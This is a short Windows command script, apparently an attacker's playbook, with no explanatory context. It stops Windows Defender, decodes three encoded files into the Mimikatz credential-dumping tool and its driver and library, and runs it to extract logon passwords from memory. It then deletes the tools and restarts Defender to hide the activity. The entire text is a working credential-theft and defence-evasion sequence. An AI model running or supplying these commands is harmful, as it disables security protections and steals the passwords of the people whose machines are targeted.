net stop WinDefend
certutil -decode mimione mimikatz.exe
certutil -decode mimitwo mimidrv.sys
certutil -decode mimithree mimilib.dll
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords" "exit"
del mimikatz.exe mimidrv.sys mimilib.dll
net start WinDefend